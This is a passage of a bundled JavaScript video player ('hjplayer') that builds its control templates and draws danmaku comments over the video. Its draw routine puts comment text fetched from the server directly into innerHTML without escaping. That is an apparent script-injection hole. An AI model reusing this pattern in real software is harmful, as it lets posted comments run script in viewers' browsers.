                        <span class="hjplayer-label">0.75</span>
                    </div>
                    <div class="hjplayer-setting-speed-item" data-speed="1">
                        <span class="hjplayer-label">${$escape(translate("Normal"))}</span>
                    </div>
                    <div class="hjplayer-setting-speed-item" data-speed="1.25">
                        <span class="hjplayer-label">1.25</span>
                    </div>
                    <div class="hjplayer-setting-speed-item" data-speed="1.5">
                        <span class="hjplayer-label">1.5</span>
                    </div>
                    <div class="hjplayer-setting-speed-item" data-speed="2">
                        <span class="hjplayer-label">2</span>
                    </div>
                </div>
            </div>
        </div>
        `;
					// 14. 拼接全屏按钮组
					htmlStr += `
        <div class="hjplayer-full">
            <button class="hjplayer-icon hjplayer-full-in-icon" 
                    data-balloon="${$escape(translate("Web full screen"))}" data-balloon-pos="up">
                <span class="hjplayer-icon-content">${iconConfig.fullWeb}</span>
            </button>
            <button class="hjplayer-icon hjplayer-full-icon" 
                    data-balloon="${$escape(translate("Full screen"))}" data-balloon-pos="up">
                <span class="hjplayer-icon-content">${iconConfig.full}</span>
            </button>
            <button class="hjplayer-icon hjplayer-fulloff-icon" data-balloon="退出全屏" data-balloon-pos="up">
                <span class="hjplayer-icon-content">
                    <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" version="1.1" viewBox="0 0 1024 1024">
                        <path class="hjplayer-fill" style="fill:#ffffff" d="M308.3555518 432.05693128H150.1524268c-17.67162586 0-32.81873308-14.30560177-32.81873308-32.81873308s14.30560177-32.81873308 32.81873308-32.81873309h158.203125c30.29421522 0 49.64885273-9.25656603 49.6488535-56.38090166V150.1524268c0-17.67162586 14.30560177-32.81873308 32.81873308-32.81873308s32.81873308 14.30560177 32.81873309 32.81873308v160.72764287c-0.84150622 75.73553842-43.75831155 121.17686162-115.28631967 121.17686161z m321.45528573 471.24335092c-17.67162586 0-31.97722764-14.30560177-31.97722687-31.97722687V709.75390625c0-75.73553842 42.91680533-121.17686162 114.44481346-121.17686162h158.203125c17.67162586 0 31.97722764 14.30560177 31.97722763 31.97722764s-14.30560177 31.97722764-31.97722763 31.97722687H712.27842412c-30.29421522 0-49.64885273 9.25656603-49.64885273 56.38090089v160.72764287c-0.84150622 18.51313131-15.14710799 33.6602393-32.81873386 33.6602393z" id="hjplayer-fulloff"></path>
                    </svg>
                </span>
            </button>
        </div>
    </div>
        `;
					// 15. 拼接进度条
					htmlStr += `
    <div class="hjplayer-bar-wrap">
        <div class="hjplayer-bar-time hidden">00:00</div>
        <div class="hjplayer-bar-preview"></div>
        <div class="hjplayer-bar">
            <div class="hjplayer-loaded" style="width: 0;"></div>
            <div class="hjplayer-played" style="width: 0; background: ${$escape(playerOptions.theme)};">
                <span class="hjplayer-thumb" style="background: ${$escape(playerOptions.theme)}">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 18 18" width="18" height="18" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);">
                        <defs>
                            <clipPath id="__lottie_element_25">
                                <rect width="18" height="18" x="0" y="0"></rect>
                            </clipPath>
                        </defs>
                        <g clip-path="url(#__lottie_element_25)">
                            <g transform="matrix(1,0,0,1,8.937000274658203,8.25)" opacity="0.14" style="display: block;">
                                <g opacity="1" transform="matrix(1,0,0,1,0.07500000298023224,1.2130000591278076)">
                                    <path fill="rgb(251,114,153)" fill-opacity="1" d=" M9,-3.5 C9,-3.5 9,3.5 9,3.5 C9,5.707600116729736 7.207600116729736,7.5 5,7.5 C5,7.5 -5,7.5 -5,7.5 C-7.207600116729736,7.5 -9,5.707600116729736 -9,3.5 C-9,3.5 -9,-3.5 -9,-3.5 C-9,-5.707600116729736 -7.207600116729736,-7.5 -5,-7.5 C-5,-7.5 5,-7.5 5,-7.5 C7.207600116729736,-7.5 9,-5.707600116729736 9,-3.5z"></path>
                                </g>
                            </g>
                            <g transform="matrix(1,0,0,1,9.140999794006348,8.67199993133545)" opacity="0.28" style="display: block;">
                                <g opacity="1" transform="matrix(1,0,0,1,-0.1509999930858612,0.7990000247955322)">
                                    <path fill="rgb(251,114,153)" fill-opacity="1" d=" M8,-3 C8,-3 8,3 8,3 C8,4.931650161743164 6.431650161743164,6.5 4.5,6.5 C4.5,6.5 -4.5,6.5 -4.5,6.5 C-6.431650161743164,6.5 -8,4.931650161743164 -8,3 C-8,3 -8,-3 -8,-3 C-8,-4.931650161743164 -6.431650161743164,-6.5 -4.5,-6.5 C-4.5,-6.5 4.5,-6.5 4.5,-6.5 C6.431650161743164,-6.5 8,-4.931650161743164 8,-3z"></path>
                                </g>
                            </g>
                            <g transform="matrix(0.9883429408073425,-0.7275781631469727,0.6775955557823181,0.920446515083313,7.3224687576293945,-0.7606706619262695)" opacity="1" style="display: block;">
                                <g opacity="1" transform="matrix(0.9937776327133179,-0.11138220876455307,0.11138220876455307,0.9937776327133179,-2.5239999294281006,1.3849999904632568)">
                                    <path fill="rgb(0,0,0)" fill-opacity="1" d=" M0.75,-1.25 C0.75,-1.25 0.75,1.25 0.75,1.25 C0.75,1.663925051689148 0.4139249920845032,2 0,2 C0,2 0,2 0,2 C-0.4139249920845032,2 -0.75,1.663925051689148 -0.75,1.25 C-0.75,1.25 -0.75,-1.25 -0.75,-1.25 C-0.75,-1.663925051689148 -0.4139249920845032,-2 0,-2 C0,-2 0,-2 0,-2 C0.4139249920845032,-2 0.75,-1.663925051689148 0.75,-1.25z" style="fill: #000;"></path>
                                </g>
                            </g>
                            <g transform="matrix(1.1436611413955688,0.7535901665687561,-0.6317168474197388,0.9587040543556213,16.0070743560791,2.902894973754883)" opacity="1" style="display: block;">
                                <g opacity="1" transform="matrix(0.992861807346344,0.1192704513669014,-0.1192704513669014,0.992861807346344,-2.5239999294281006,1.3849999904632568)">
                                    <path fill="rgb(0,0,0)" fill-opacity="1" d=" M0.75,-1.25 C0.75,-1.25 0.75,1.25 0.75,1.25 C0.75,1.663925051689148 0.4139249920845032,2 0,2 C0,2 0,2 0,2 C-0.4139249920845032,2 -0.75,1.663925051689148 -0.75,1.25 C-0.75,1.25 -0.75,-1.25 -0.75,-1.25 C-0.75,-1.663925051689148 -0.4139249920845032,-2 0,-2 C0,-2 0,-2 0,-2 C0.4139249920845032,-2 0.75,-1.663925051689148 0.75,-1.25z" style="fill: #000;"></path>
                                </g>
                            </g>
                            <g transform="matrix(1,0,0,1,8.890999794006348,8.406000137329102)" opacity="1" style="display: block;">
                                <g opacity="1" transform="matrix(1,0,0,1,0.09099999815225601,1.1009999513626099)">
                                    <path fill="rgb(255,255,255)" fill-opacity="1" d=" M7,-3 C7,-3 7,3 7,3 C7,4.379749774932861 5.879749774932861,5.5 4.5,5.5 C4.5,5.5 -4.5,5.5 -4.5,5.5 C-5.879749774932861,5.5 -7,4.379749774932861 -7,3 C-7,3 -7,-3 -7,-3 C-7,-4.379749774932861 -5.879749774932861,-5.5 -4.5,-5.5 C-4.5,-5.5 4.5,-5.5 4.5,-5.5 C5.879749774932861,-5.5 7,-4.379749774932861 7,-3z"></path>
                                    <path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(0,0,0)" stroke-opacity="1" stroke-width="1.5" d=" M7,-3 C7,-3 7,3 7,3 C7,4.379749774932861 5.879749774932861,5.5 4.5,5.5 C4.5,5.5 -4.5,5.5 -4.5,5.5 C-5.879749774932861,5.5 -7,4.379749774932861 -7,3 C-7,3 -7,-3 -7,-3 C-7,-4.379749774932861 -5.879749774932861,-5.5 -4.5,-5.5 C-4.5,-5.5 4.5,-5.5 4.5,-5.5 C5.879749774932861,-5.5 7,-4.379749774932861 7,-3z"></path>
                                </g>
                            </g>
                            <g transform="matrix(1,0,0,1,8.89900016784668,8.083999633789062)" opacity="1" style="display: block;">
                                <g opacity="1" transform="matrix(1,0,0,1,-2.5239999294281006,1.3849999904632568)">
                                    <path fill="rgb(0,0,0)" fill-opacity="1" d=" M0.875,-1.125 C0.875,-1.125 0.875,1.125 0.875,1.125 C0.875,1.607912540435791 0.48291251063346863,2 0,2 C0,2 0,2 0,2 C-0.48291251063346863,2 -0.875,1.607912540435791 -0.875,1.125 C-0.875,1.125 -0.875,-1.125 -0.875,-1.125 C-0.875,-1.607912540435791 -0.48291251063346863,-2 0,-2 C0,-2 0,-2 0,-2 C0.48291251063346863,-2 0.875,-1.607912540435791 0.875,-1.125z" style="fill: #000;"></path>
                                </g>
                            </g>
                            <g transform="matrix(1,0,0,1,14.008999824523926,8.083999633789062)" opacity="1" style="display: block;">
                                <g opacity="1" transform="matrix(1,0,0,1,-2.5239999294281006,1.3849999904632568)">
                                    <path fill="rgb(0,0,0)" fill-opacity="1" d=" M0.8999999761581421,-1.100000023841858 C0.8999999761581421,-1.100000023841858 0.8999999761581421,1.100000023841858 0.8999999761581421,1.100000023841858 C0.8999999761581421,1.596709966659546 0.4967099726200104,2 0,2 C0,2 0,2 0,2 C-0.4967099726200104,2 -0.8999999761581421,1.596709966659546 -0.8999999761581421,1.100000023841858 C-0.8999999761581421,1.100000023841858 -0.8999999761581421,-1.100000023841858 -0.8999999761581421,-1.100000023841858 C-0.8999999761581421,-1.596709966659546 -0.4967099726200104,-2 0,-2 C0,-2 0,-2 0,-2 C0.4967099726200104,-2 0.8999999761581421,-1.596709966659546 0.8999999761581421,-1.100000023841858z" style="fill: #000;"></path>
                                </g>
                            </g>
                        </g>
                    </svg>
                </span>
            </div>
        </div>
  </div>
    </div>
  `;
					// 16. 拼接弹幕发送框和设置面板
					htmlStr += `
  <div class="hjplayer-icons hjplayer-comment-box">
      <div class="hjplayer-setting-item hjplayer-setting-showdan showdan-setting">
          <span class="hjplayer-label"></span>
          <div class="hjplayer-toggle">
              <input class="hjplayer-showdan-setting-input" type="checkbox" name="hjplayer-toggle-dan">
              <label for="hjplayer-toggle-dan"></label>
          </div>
      </div>
      <button class="hjplayer-icon hjplayer-comment-setting-icon" 
              data-balloon="${$escape(translate("Setting"))}" data-balloon-pos="up">
          <span class="hjplayer-icon-content">${iconConfig.pallette}</span>
      </button>
      <div class="hjplayer-comment-setting-box">
          <div class="hjplayer-setting-item hjplayer-setting-danunlimit">
              <span class="hjplayer-label">${$escape(translate("Unlimited danmaku"))}</span>
              <div class="hjplayer-toggle">
                  <input class="hjplayer-danunlimit-setting-input" type="checkbox" name="hjplayer-toggle-danunlimit">
                  <label for="hjplayer-toggle-danunlimit"></label>
              </div>
          </div>
          <div class="hjplayer-setting-item hjplayer-setting-danmaku">
              <span class="hjplayer-label">${$escape(translate("Opacity for danmaku"))}</span>
              <div class="hjplayer-danmaku-bar-wrap">
                  <div class="hjplayer-danmaku-bar">
                      <div class="hjplayer-danmaku-bar-inner">
                          <span class="hjplayer-thumb"></span>
                      </div>
                  </div>
              </div>
          </div>
          <div class="hjplayer-comment-setting-type">
              <div class="hjplayer-comment-setting-title">${$escape(translate("Set danmaku type"))}</div>
              <label>
                  <input type="radio" name="hjplayer-danmaku-type-${$escape(playerIndex)}" value="top">
                  <span>${$escape(translate("Top"))}</span>
              </label>
              <label>
                  <input type="radio" name="hjplayer-danmaku-type-${$escape(playerIndex)}" value="right" checked>
                  <span>${$escape(translate("Rolling"))}</span>
              </label>
              <label>
                  <input type="radio" name="hjplayer-danmaku-type-${$escape(playerIndex)}" value="bottom">
                  <span>${$escape(translate("Bottom"))}</span>
              </label>
          </div>
          <div class="hjplayer-comment-setting-font">
              <div class="hjplayer-comment-setting-title">弹幕大小</div>
              <label><input type="radio" name="hjplayer-danmaku-font-0" value="50px"><span>超大</span></label>
              <label><input type="radio" name="hjplayer-danmaku-font-0" value="35px"><span>较大</span></label>
              <label><input type="radio" name="hjplayer-danmaku-font-0" value="27.5px" checked><span>标准</span></label>
              <label><input type="radio" name="hjplayer-danmaku-font-0" value="18px"><span>较小</span></label>
          </div>
          <div class="hjplayer-comment-setting-color">
              <div class="hjplayer-comment-setting-title">${$escape(translate("Set danmaku color"))}</div>
              <label>
                  <input type="radio" name="hjplayer-danmaku-color-${$escape(playerIndex)}" value="#FE0302">
                  <span style="background:#FE0302;"></span>
              </label>
              <label>
                  <input type="radio" name="hjplayer-danmaku-color-${$escape(playerIndex)}" value="#FF7204">
                  <span style="background: #FF7204"></span>
              </label>
              <label>
                  <input type="radio" name="hjplayer-danmaku-color-${$escape(playerIndex)}" value="#FFAA02">
                  <span style="background: #FFAA02"></span>
              </label>
              <label>
                  <input type="radio" name="hjplayer-danmaku-color-${$escape(playerIndex)}" value="#FFD302">
                  <span style="background: #FFD302"></span>
              </label>
              <label>
                  <input type="radio" name="hjplayer-danmaku-color-${$escape(playerIndex)}" value="#FFFF00">
                  <span style="background: #FFFF00"></span>
              </label>
              <label>
                  <input type="radio" name="hjplayer-danmaku-color-${$escape(playerIndex)}" value="#A0EE00">
                  <span style="background: #A0EE00"></span>
              </label>
              <label>
                  <input type="radio" name="hjplayer-danmaku-color-${$escape(playerIndex)}" value="#00CD00">
                  <span style="background: #00CD00;"></span>
              </label>
              <label>
                  <input type="radio" name="hjplayer-danmaku-color-${$escape(playerIndex)}" value="#019899">
                  <span style="background: #019899"></span>
              </label>
              <label>
                  <input type="radio" name="hjplayer-danmaku-color-${$escape(playerIndex)}" value="#4266BE">
                  <span style="background: #4266BE"></span>
              </label>
              <label>
                  <input type="radio" name="hjplayer-danmaku-color-${$escape(playerIndex)}" value="#89D5FF">
                  <span style="background: #89D5FF"></span>
              </label>
              <label>
                  <input type="radio" name="hjplayer-danmaku-color-${$escape(playerIndex)}" value="#CC0273">
                  <span style="background: #CC0273"></span>
              </label>
              <label>
                  <input type="radio" name="hjplayer-danmaku-color-${$escape(playerIndex)}" value="#222222">
                  <span style="background: #222222"></span>
              </label>
              <label>
                  <input type="radio" name="hjplayer-danmaku-color-${$escape(playerIndex)}" value="#9B9B9B">
                  <span style="background: #9B9B9B"></span>
              </label>
              <label>
                  <input type="radio" name="hjplayer-danmaku-color-${$escape(playerIndex)}" value="#FFFFFF" checked>
                  <span style="background: #FFFFFF"></span>
              </label>
          </div>
      </div>
      <input class="hjplayer-comment-input" type="text" 
             placeholder="${$escape(translate("Input danmaku, hit Enter"))}" maxlength="30">
      <button class="hjplayer-icon hjplayer-send-icon" 
              data-balloon="${$escape(translate("Send"))}" data-balloon-pos="up">
          <span class="hjplayer-icon-content">${iconConfig.send}</span>
      </button>
      <input id="dmtext" dmtype="right" size="27.5px" class="hj-hjplayer-comment-input" type="text" 
             placeholder="${$escape(translate("Input danmaku, hit Enter"))}" maxlength="30">
      <button class="hjplayer-icon hj-hjplayer-send-icon" data-balloon="${$escape(translate("Send"))}" data-balloon-pos="up">发送</button>
  </div>
  </div>
  `;
					// 17. 拼接信息面板
					htmlStr += `
<div class="hjplayer-info-panel hjplayer-info-panel-hide">
    <div class="hjplayer-info-panel-close">关闭</div>
    <div class="hjplayer-info-panel-item hjplayer-info-panel-item-version">
        <span class="hjplayer-info-panel-item-title">播放器版本</span>
        <span class="hjplayer-info-panel-item-data"></span>
    </div>
    <div class="hjplayer-info-panel-item hjplayer-info-panel-item-fps">
        <span class="hjplayer-info-panel-item-title">播放器帧率</span>
        <span class="hjplayer-info-panel-item-data"></span>
    </div>
    <div class="hjplayer-info-panel-item hjplayer-info-panel-item-type">
        <span class="hjplayer-info-panel-item-title">视频类型</span>
        <span class="hjplayer-info-panel-item-data"></span>
    </div>
    <div class="hjplayer-info-panel-item hjplayer-info-panel-item-url">
        <span class="hjplayer-info-panel-item-title">视频地址</span>
        <span class="hjplayer-info-panel-item-data"></span>
    </div>
    <div class="hjplayer-info-panel-item hjplayer-info-panel-item-resolution">
        <span class="hjplayer-info-panel-item-title">视频分辨率</span>
        <span class="hjplayer-info-panel-item-data"></span>
    </div>
    <div class="hjplayer-info-panel-item hjplayer-info-panel-item-duration">
        <span class="hjplayer-info-panel-item-title">视频时长</span>
        <span class="hjplayer-info-panel-item-data"></span>
    </div>
        `;
					// 18. 拼接弹幕相关信息（按需显示）
					if (playerOptions.danmaku) {
						htmlStr += `
    <div class="hjplayer-info-panel-item hjplayer-info-panel-item-danmaku-id">
        <span class="hjplayer-info-panel-item-title">弹幕 ID</span>
        <span class="hjplayer-info-panel-item-data"></span>
    </div>
    <div class="hjplayer-info-panel-item hjplayer-info-panel-item-danmaku-api">
        <span class="hjplayer-info-panel-item-title">弹幕API</span>
        <span class="hjplayer-info-panel-item-data"></span>
    </div>
    <div class="hjplayer-info-panel-item hjplayer-info-panel-item-danmaku-amount">
        <span class="hjplayer-info-panel-item-title">弹幕数量</span>
        <span class="hjplayer-info-panel-item-data"></span>
    </div>
    <div class="hjplayer-info-panel-item hjplayer-info-panel-item-title-amount">
        <span class="hjplayer-info-panel-item-title">视频标题</span>
        <span class="hjplayer-info-panel-item-data" id="vod-title"></span>
    </div>
        `;
					}
					// 19. 拼接右键菜单和在线人数面板
					htmlStr += `
</div>
<div class="hjplayer-menu">
        `;
					// 遍历右键菜单选项
					$each(playerOptions.contextmenu, function(menuItem, idx) {
						const link = menuItem.link || "javascript:void(0);";
						htmlStr += `
        <div class="hjplayer-menu-item">
            <a href="${$escape(link)}">${$escape(translate(menuItem.text))}</a>
        </div>
        `;
					});
					htmlStr += `
</div>
<div class="hjplayer-notice"></div>
<div class="hjplayer-danmu">
    <div class="hjplayer-watching">
        <span class="hjplayer-watching-number" title="播放器在线人数">1</span>人正在观看,
        <span class="danmuku-num">100</span>条弹幕
    </div>
    <ul class="hjplayer-list">
        <li>时间</li>
        <li>弹幕内容</li>
        <li>发送时间</li>
    </ul>
    <ul class="list-show"></ul>
</div>
`;
					// 20. 拼接 SVG 图标定义
					htmlStr += `
<div class="svg-icon">
    <svg aria-hidden="true">
        <symbol id="icon-play" width="64" height="64" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
            <defs>
                <filter x="-11.2%" y="-10.8%" width="122.4%" height="125.5%" filterUnits="objectBoundingBox" id="pid-1-svgo-a">
                    <feOffset dy="1" in="SourceAlpha" result="shadowOffsetOuter1"></feOffset>
                    <feGaussianBlur stdDeviation="2" in="shadowOffsetOuter1" result="shadowBlurOuter1"></feGaussianBlur>
                    <feComposite in="shadowBlurOuter1" in2="SourceAlpha" operator="out" result="shadowBlurOuter1"></feComposite>
                    <feColorMatrix values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.3 0" in="shadowBlurOuter1"></feColorMatrix>
                </filter>
                <path d="M52.352 13.5c4.837 0 8.707 4.32 8.647 9.72v21.06C61 49.62 57.128 54 52.29 54h-2.479c0 1.681-1.452 3-3.206 3S43.4 55.62 43.4 54H20.841c0 1.681-1.452 3-3.204 3-1.756 0-3.206-1.38-3.206-3h-2.722C6.87 54 3 49.68 3 44.28V23.22c0-5.4 3.87-9.72 8.709-9.72h11.25l-4.78-4.44c-.725-.661-.725-1.8 0-2.52.424-.36.908-.54 1.391-.54.546 0 1.029.18 1.392.54l7.5 6.96h7.318l7.5-6.96c.422-.36.907-.54 1.39-.54.544 0 1.029.18 1.392.54.725.659.725 1.8 0 2.52l-4.78 4.44h11.07zM26.527 45.54l17.418-10.08c1.45-.901 1.45-2.221 0-3.122L26.527 22.2c-1.452-.84-2.662-.12-2.662 1.56v20.22c0 1.74 1.21 2.4 2.662 1.561z" id="pid-1-svgo-b"></path>
            </defs>
            <g fill="none" fill-rule="evenodd">
                <use fill="#000" filter="url(#pid-1-svgo-a)" xlink:href="#pid-1-svgo-b"></use>
                <use fill-opacity=".7" fill="#FFF" xlink:href="#pid-1-svgo-b"></use>
                <path d="M26.527 45.541c-1.452.84-2.662.18-2.662-1.56V23.76c0-1.68 1.21-2.4 2.662-1.56L43.945 32.34c1.45.9 1.45 2.22 0 3.121L26.527 45.541z" fill="#000" opacity=".06"></path>
            </g>
        </symbol>
        <symbol id="icon-play-xj" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22">
            <path d="M16 5a1 1 0 00-1 1v4.615a1.431 1.431 0 00-.615-.829L7.21 5.23A1.439 1.439 0 005 6.445v9.11a1.44 1.44 0 002.21 1.215l7.175-4.555a1.436 1.436 0 00.616-.828V16a1 1 0 002 0V6C17 5.448 16.552 5 16 5z"></path>
        </symbol>
    </svg>
</div>
        `;
					// 返回拼接完成的 HTML 字符串
					return htmlStr;
				};
			},
			/**
			 * 核心工具对象模块，提供转义和遍历功能
			 * @param {*} e - 模块导出载体（符合模块化规范）
			 * @param {*} t - 上下文对象
			 * @param {*} n - 模块依赖加载函数
			 */
			function(e, t, n) {
				// 内部初始化函数，绑定上下文并加载依赖
				(function(context) {
					/**
					 * 统一将任意类型值转换为字符串
					 * @param {*} value - 待转换的值
					 * @returns {string} 转换后的字符串
					 */
					function convertToString(value) {
						// 若已是字符串，直接返回
						if (typeof value === 'string') {
							return value;
						}
						// 处理 undefined 或 null，返回空字符串
						if (value === undefined || value === null) {
							return '';
						}
						// 处理函数类型，执行函数后递归转换返回值
						if (typeof value === 'function') {
							return convertToString(value.call(value));
						}
						// 其他类型（对象、数组等）使用 JSON 序列化
						return JSON.stringify(value);
					}
					/**
					 * HTML 特殊字符转义，转义 " & ' < > 五种字符
					 * @param {string} str - 待转义的原始字符串
					 * @returns {string} 转义后的安全字符串
					 */
					function escapeHtml(str) {
						const rawStr = String(str);
						const specialCharRegex = /["&'<>]/;
						// 若不含特殊字符，直接返回原字符串
						if (!specialCharRegex.test(rawStr)) {
							return rawStr;
						}
						let escapedStr = '';
						let lastIndex = 0;
						let currentCharCode;
						let escapeEntity;
						let strLength = rawStr.length;
						// 遍历字符串，逐个处理特殊字符
						for (let currentIndex = 0; currentIndex < strLength; currentIndex++) {
							currentCharCode = rawStr.charCodeAt(currentIndex);
							escapeEntity = '';
							// 根据字符编码匹配对应转义实体
							switch (currentCharCode) {
								case 34: // 双引号 "
									escapeEntity = '&#34;';
									break;
								case 38: // 和号 &
									escapeEntity = '&#38;';
									break;
								case 39: // 单引号 '
									escapeEntity = '&#39;';
									break;
								case 60: // 小于号 <
									escapeEntity = '&#60;';
									break;
								case 62: // 大于号 >
									escapeEntity = '&#62;';
									break;
								default: // 非特殊字符，跳过
									continue;
							}
							// 拼接上一段非特殊字符内容
							if (lastIndex !== currentIndex) {
								escapedStr += rawStr.substring(lastIndex, currentIndex);
							}
							// 更新最后处理位置，并拼接转义实体
							lastIndex = currentIndex + 1;
							escapedStr += escapeEntity;
						}
						// 拼接最后一段未处理的非特殊字符内容
						if (lastIndex !== rawStr.length) {
							escapedStr += rawStr.substring(lastIndex);
						}
						return escapedStr;
					}
					// 加载依赖模块，创建工具对象原型
					const dependencyModule = n(34);
					const toolObject = Object.create(dependencyModule ? context : window);
					const specialCharRegex = /["&'<>]/; // 特殊字符匹配正则
					/**
					 * 先将任意值转为字符串，再进行 HTML 特殊字符转义
					 * @param {*} value - 待转义的值
					 * @returns {string} 转义后的安全字符串
					 */
					toolObject.$escape = function(value) {
						const strValue = convertToString(value);
						return escapeHtml(strValue);
					};
					/**
					 * 通用遍历方法，支持数组和对象
					 * @param {Array|Object} collection - 待遍历的集合（数组/对象）
					 * @param {Function} callback - 遍历回调函数，参数：(元素/属性值, 索引/属性名)
					 */
					toolObject.$each = function(collection, callback) {
						// 数组遍历：按索引顺序执行回调
						if (Array.isArray(collection)) {
							const collectionLength = collection.length;
							for (let index = 0; index < collectionLength; index++) {
								callback(collection[index], index);
							}
						} else {
							// 对象遍历：遍历可枚举属性，执行回调
							for (const propName in collection) {
								callback(collection[propName], propName);
							}
						}
					};
					// 导出工具对象
					e.exports = toolObject;
				}).call(t, n(1));
			},
			// -----------------------------------------------------------------------------------------------------------------
			function(e, t, n) {
				(function(t) {
					e.exports = !1;
					try {
						e.exports = "[object process]" === Object.prototype.toString.call(t.process)
					} catch (e) {}
				}).call(t, n(1))
			},
			function(e, t, n) {
				function i(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
						return typeof e
					} : function(e) {
						return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol
							.prototype ? "symbol" :
							typeof e
					},
					o = function() {
						function e(e, t) {
							for (var n = 0; n < t.length; n++) {
								var i = t[n];
								i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i
									.writable = !0), Object.defineProperty(
									e, i.key, i)
							}
						}
						return function(t, n, i) {
							return n && e(t.prototype, n), i && e(t, i), t
						}
					}(),
					s = function() {
						function e(t) {
							i(this, e), this.options = t, this.container = this.options.container, this
								.danTunnel = {
									right: {},
									top: {},
									bottom: {}
								}, this.danIndex = 0, this.dan = [], this.showing = !0, this._opacity = this
								.options.opacity, this.events =
								this.options.events, this.unlimited = this.options.unlimited, this._measure(""),
								this.load()
						}
						return o(e, [{
							key: "load",
							value: function() {
								var e = this,
									t = void 0;
								t = this.options.api.maximum ? this.options.api.address +
									"&id=" + this.options.api.id + "&max=" + this.options
									.api.maximum : this.options.api.address + "&id=" + this
									.options.api.id;
								var n = (this.options.api.addition || []).slice(0);
								n.push(t), this.events && this.events.trigger(
									"danmaku_load_start", n), this._readAllEndpoints(n,
									function(t) {
										e.dan = [].concat.apply([], t).sort(function(e, t) {
												return e.time - t.time
											}), window.requestAnimationFrame(function() {
												e.frame()
											}), e.options.callback(), e.events && e.events
											.trigger("danmaku_load_end")
									})
							}
						}, {
							key: "reload",
							value: function(e) {
								this.options.api = e, this.dan = [], this.clear(), this.load()
							}
						}, {
							key: "_readAllEndpoints",
							value: function(e, t) {
								for (var n = this, i = [], a = 0, o = 0; o < e.length; ++o) this
									.options.apiBackend.read(e[o], function(o) {
										return function(s, r) {
											if (++a, s) s.response ? n.options.error(s
												.response.msg) : n.options.error(
												"弹幕加载失败：" + s.status), i[
												o] = [];
											else {
												var l = ["right", "top", "bottom"];
												i[o] = r ? r.map(function(e) {
													return {
														time: e[0],
														type: e[1],
														color: e[2],
														author: e[3],
														text: e[4],
														size: e[7]
													}
												}) : []
											}
											if (a === e.length) return t(i)
										}
									}(o))
							}
						}, {
							key: "send",
							value: function(e, t) {
								var n = {
									token: this.options.api.token,
									player: this.options.api.id,
									author: this.options.api.user,
									time: this.options.time(),
									text: e.text,
									color: e.color,
									type: e.type,
									size: e.size
								};
								this.options.apiBackend.send(this.options.api.address, n, t),
									this.dan.splice(this.danIndex, 0, n), this.danIndex++;
								var i = {
									text: this.htmlEncode(n.text),
									color: n.color,
									type: n.type,
									size: n.size,
									border: "2px solid " + this.options.borderColor
								};
								this.draw(i), this.events && this.events.trigger("danmaku_send",
									n)
							}
						}, {
							key: "frame",
							value: function() {
								var e = this;
								if (this.dan.length && !this.paused && this.showing) {
									for (var t = this.dan[this.danIndex], n = []; t && this
										.options.time() > parseFloat(t.time);) n.push(t),
										t = this.dan[++this.danIndex];
									this.draw(n)
								}
								window.requestAnimationFrame(function() {
									e.frame()
								})
							}
						}, {
							key: "opacity",
							value: function(e) {
								if (void 0 !== e) {
									for (var t = this.container.getElementsByClassName(
											"hjplayer-danmaku-item"), n = 0; n < t.length; n++)
										t[
											n].style.opacity = e;
									this._opacity = e, this.events && this.events.trigger(
										"danmaku_opacity", this._opacity)
								}
								return this._opacity
							}
						}, {
							key: "draw",
							value: function(e) {
								var t = this;
								if (this.showing) {
									var n = this.options.height,
										i = this.container.offsetWidth,
										o = this.container.offsetHeight,
										s = parseInt(o / n),
										r = function(e) {
											var n = e.offsetWidth || parseInt(e.style.width),
												i = e.getBoundingClientRect().right || t
												.container.getBoundingClientRect().right + n;
											return t.container.getBoundingClientRect().right - i
										},
										l = function(e) {
											return (i + e) / 5
										},
										c = function(e, n, o) {
											for (var c = i / l(o), u = 0; t.unlimited || u <
												s; u++) {
												var d = function(a) {
													var o = t.danTunnel[n][a + ""];
													if (!o || !o.length) return t.danTunnel[
															n][a + ""] = [e], e
														.addEventListener(
															"animationend",
															function() {
																t.danTunnel[n][a + ""]
																	.splice(0, 1)
															}), {
															v: a % s
														};
													if ("right" !== n) return "continue";
													for (var u = 0; u < o.length; u++) {
														var d = r(o[u]) - 10;
														if (d <= i - c * l(parseInt(o[u]
																.style.width)) || d <= 0)
															break;
														if (u === o.length - 1) return t
															.danTunnel[n][a + ""].push(
																e), e.addEventListener(
																"animationend",
																function() {
																	t.danTunnel[n][a +
																		""
																	].splice(0, 1)
																}), {
																v: a % s
															}
													}
												}(u);
												switch (d) {
													case "continue":
														continue;
													default:
														if ("object" === (void 0 === d ?
																"undefined" : a(d))) return d.v
												}
											}
											return -1
										};
									"[object Array]" !== Object.prototype.toString.call(e) && (
										e = [e]);
									for (var u = document.createDocumentFragment(), d = 0; d < e
										.length; d++) ! function(a) {
										e[a].type || (e[a].type = "right"), e[a].color || (
											e[a].color = "#fff");
										e[a].size || (e[a].fontSize = "27.5px");
										var o = document.createElement("div");
										o.classList.add("hjplayer-danmaku-item"), o
											.classList.add("hjplayer-danmaku-" + e[a]
												.type), e[a].border ?
											o.innerHTML = '<span style="border-bottom:' + e[
												a].border + '">' + e[a].text + "</span>" : o
											.innerHTML =
											e[a].text, o.style.opacity = t._opacity, o.style
											.color = e[a].color, o.style.fontSize = e[a]
											.size, o.addEventListener(
												"animationend",
												function() {
													t.container.removeChild(o)
												});
										var s = t._measure(e[a].text),
											r = void 0;
										switch (e[a].type) {
											case "right":
												r = c(o, e[a].type, s), r >= 0 && (o.style
													.width = s + 1 + "px", o.style.top =
													n * r + "px", o.style
													.transform = "translateX(-" + i +
													"px)");
												break;
											case "top":
												r = c(o, e[a].type), r >= 0 && (o.style
													.top = n * r + "px");
												break;
											case "bottom":
												r = c(o, e[a].type), r >= 0 && (o.style
